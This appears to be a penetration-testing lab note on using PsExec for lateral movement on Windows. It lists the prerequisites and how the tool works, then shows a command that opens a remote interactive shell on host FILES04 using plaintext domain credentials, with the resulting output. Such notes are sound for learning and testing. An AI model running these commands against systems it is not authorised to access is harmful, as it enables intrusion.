# Psexec

## Requisites

* User that authenticates to the target machine needs to be part of the Administrators local group
* _ADMIN$_ share must be available (by default on new windows server)
* File and Printer Sharing has to be turned on (by default on new windows server)

## What Psexec does

To execute the command remotely, PsExec performs the following tasks:

* Writes **psexesvc.exe** into the **C:\Windows** directory
* Creates and spawns a service on the remote host
* Runs the requested program/command as a child process of **psexesvc.exe**

## Steps

1. Transfer Psexec on the machine from which we want to use psexec (form SysInternalSuite)
2. Execute Psexec and validate interactive shell on target (here the target is FILES04

```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```
